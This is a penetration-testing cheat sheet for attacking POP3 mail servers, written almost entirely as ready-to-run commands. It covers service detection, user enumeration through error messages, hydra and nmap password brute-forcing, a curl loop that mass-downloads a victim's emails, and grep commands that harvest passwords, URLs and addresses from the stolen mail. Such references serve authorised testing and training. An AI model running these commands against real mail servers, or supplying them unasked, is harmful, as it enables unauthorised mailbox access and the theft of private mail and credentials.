# Post Office Protocol (POP3)

## Service Detection

```
nmap -p 110,995 target.com
nmap -p 110,995 -sV target.com
```

## Banner Grabbing

### netcat
```
nc target.com 110
```

### telnet
```
telnet target.com 110
```

## Connect

### Telnet (POP3)
```
telnet target.com 110

# Basic POP3 conversation
USER username
PASS password
LIST
RETR 1
QUIT
```

### openssl (POP3S)
```
openssl s_client -connect target.com:995 -crlf -quiet

# POP3 commands
USER username
PASS password
LIST
QUIT
```

### cURL
```
# List emails
curl -u username:password pop3://target.com/

# Read specific email
curl -u username:password pop3://target.com/1

# POP3S
curl -u username:password pop3s://target.com/ --insecure
```


## User Enumeration

**Note:** POP3 doesn't have VRFY/EXPN like SMTP, but you can enumerate via login attempts.
```
# Different error messages may reveal valid users
telnet target.com 110
USER admin
# +OK vs -ERR can indicate if user exists
```

## Brute Force

### hydra (see also hydra cheatsheet)
```
# POP3 (plaintext)
hydra -l user@target.com -P passwords.txt pop3://target.com

# POP3S (SSL/TLS)
hydra -l user@target.com -P passwords.txt pop3s://target.com:995

# Multiple users
hydra -L users.txt -P passwords.txt pop3://target.com
```

### nmap
```
nmap -p 110 --script pop3-brute target.com
```

## Post-Exploitation

### Automated Email Download using cURL
```
for i in {1..100}; do
  curl -u username:password "pop3://target.com/$i" > email_$i.eml 2>/dev/null
done
```

### Manual Email Retrieval 
```
# Or using telnet
telnet target.com 110
USER username
PASS password
STAT  # Get message count
RETR 1  # Retrieve first email
RETR 2  # Second email
```

### Credential Harvesting
```
# Search downloaded emails for credentials
grep -r "password\|credential\|username" *.eml

# Extract URLs
grep -Eiorh 'https?://[^\s]+' *.eml

# Extract email addresses
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' *.eml
```

## Common POP3 Commands

| Command | Description              | Usage         |
|--------|--------------------------|---------------|
| USER   | Username                 | USER username |
| PASS   | Password                 | PASS password |
| STAT   | Mailbox stats            | STAT          |
| LIST   | List messages            | LIST          |
| RETR   | Retrieve message         | RETR 1        |
| DELE   | Mark for deletion        | DELE 1        |
| NOOP   | No operation             | NOOP          |
| RSET   | Reset                    | RSET          |
| TOP    | Message header + lines   | TOP 1 10      |
| UIDL   | Unique IDs               | UIDL          |
| QUIT   | Close connection         | QUIT          |